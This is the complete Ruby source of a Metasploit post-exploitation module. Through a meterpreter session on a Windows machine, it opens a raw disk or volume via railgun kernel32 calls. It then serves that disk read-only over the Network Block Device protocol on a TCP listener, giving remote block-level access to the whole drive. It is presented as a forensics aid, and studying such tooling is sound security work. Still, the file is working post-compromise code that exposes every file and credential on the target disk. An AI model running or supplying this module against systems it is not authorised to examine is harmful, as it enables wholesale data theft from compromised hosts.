##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

#
# Maps remote disks and logical volumes to a local Network Block Device
# server. Allows for forensic tools to be executed on the remote disk
# directly.
#
# R. Wesley McGrew wesley@mcgrewsecurity.com
#    http://mcgrewsecurity.com
# Mississippi State University National Forensics Training Center
#    http://msu-nftc.org

class Metasploit3 < Msf::Post

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Local NBD Server for Remote Disks',
      'Description'   => %q{Maps remote disks and logical volumes to a local Network Block
        Device server. Allows for forensic tools to be executed on the remote disk directly.},
      'License'       => MSF_LICENSE,
      'Platform'      => ['win'],
      'SessionTypes'  => ['meterpreter'],
      'Author'        => ['Wesley McGrew <wesley[at]mcgrewsecurity.com>']
    ))
    register_options(
      [
        OptString.new('DEVICE',[true,'Device to map (use enum_drives for possible names)',nil]),
        OptString.new('NBDIP',[false,'IP address for NBD server','0.0.0.0']),
        OptInt.new('NBDPORT',[false,'TCP port for NBD server',10005]),
      ], self.class)
  end


  def run
    ip_addr = datastore['NBDIP']
    port = datastore['NBDPORT']
    devname = datastore['DEVICE']

    invalid_handle_value = 0xFFFFFFFF
    invalid_set_file_pointer = 0xFFFFFFFF
    fsctl_allow_extended_dasd_io = 0x00090083
    ioctl_disk_get_drive_geometry_ex = 0x000700A0

    r = client.railgun.kernel32.CreateFileA(devname, "GENERIC_READ",
        0x3, nil, "OPEN_EXISTING", "FILE_ATTRIBUTE_READONLY", 0)
    handle = r['return']
    r = client.railgun.kernel32.DeviceIoControl(handle,fsctl_allow_extended_dasd_io,nil,0,0,0,4,nil)
    ioctl = client.railgun.kernel32.DeviceIoControl(handle,ioctl_disk_get_drive_geometry_ex,
            "",0,200,200,4,"")
    if ioctl['GetLastError'] == 6
      ioctl = client.railgun.kernel32.DeviceIoControl(handle,ioctl_disk_get_drive_geometry_ex,
        "",0,200,200,4,"")
    end
    geometry = ioctl['lpOutBuffer']
    disk_size = geometry[24,31].unpack('Q')[0]

    socket = Rex::Socket::TcpServer.create({'LocalHost'=>ip_addr,'LocalPort'=>port})
    print_status("Listening on #{ip_addr}:#{port}")
    print_status("Serving #{devname} (#{disk_size} bytes)")
    rsock = socket.accept()
    print_status("Accepted a connection")

    # Negotiation
    rsock.put('NBDMAGIC')
    rsock.put("\x00\x00\x42\x02\x81\x86\x12\x53")

    rsock.put([disk_size].pack("Q").reverse)
    rsock.put("\x00\x00\x00\x03")  # Read-only
    rsock.put("\x00"*124)
    print_line("Sent negotiation")

    while true
      request = rsock.read(28)
      magic, request, nbd_handle, offset_n, length = request.unpack("NNa8a8N")

      if magic != 0x25609513
        print_error("Wrong magic number")
        break
      end
      if request == 2
        break
      end
      if request == 1
        print_error("Attempted write on a read-only nbd")
        break
      end
      if request == 0
        client.railgun.kernel32.SetFilePointer(handle,offset_n[4,7].unpack('N')[0],
          offset_n[0,4].unpack('N')[0],0)
        rsock.put("gDf\x98\x00\x00\x00\x00")
        rsock.put(nbd_handle)
        data = client.railgun.kernel32.ReadFile(handle,length,length,4,nil)['lpBuffer']
        rsock.put(data)
      end
    end

    print_status("Closing")
    rsock.close()
    socket.close()

    client.railgun.kernel32.CloseHandle(handle)
  end
end
